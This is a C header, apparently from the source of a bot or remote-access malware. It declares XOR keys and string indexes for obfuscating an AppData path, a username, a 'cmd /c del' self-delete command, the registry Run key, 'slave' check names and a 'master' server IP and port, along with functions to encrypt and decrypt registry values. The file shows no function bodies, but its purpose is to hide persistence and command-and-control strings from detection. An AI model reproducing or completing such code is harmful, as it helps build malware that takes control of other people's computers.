#ifndef __MEM_PROTECT_H
#define __MEM_PROTECT_H

#define MEMPROTECT_XOR_REG_KEY 0xCE
#define MEMPROTECT_XOR_REG_SALT 0x63

#define MEMPROTECT_APPDATA 0x0
#define MEMPROTECT_USERNAME 0x1
#define MEMPROTECT_CMD_C_DEL 0x2
#define MEMPROTECT_CMD_C 0x3
#define MEMPROTECT_AppData 0x4
#define MEMPROTECT_REG_RUN 0x5
#define MEMPROTECT_REG_MICROSOFT 0x6
#define MEMPROTECT_SLAVE_CHECK_NAME 0x7
#define MEMPROTECT_SLAVE_CHECK_PATH 0x8
#define MEMPROTECT_MASTER_IP 0x9
#define MEMPROTECT_MASTER_PORT 0xA

#define MEMPROTECT_COUNT 0xB
#define MEMPROTECT_LIB_COUNT 0x26

extern unsigned char* memProtect_Request(int idx);
extern unsigned char* memProtect_GetLibData(int idx);

extern void memProtect_EncryptRegValue(unsigned char* data, unsigned char** odata, int* iolen);
extern void memProtect_DecryptRegValue(unsigned char* data, unsigned char** odata, int* olen);

#endif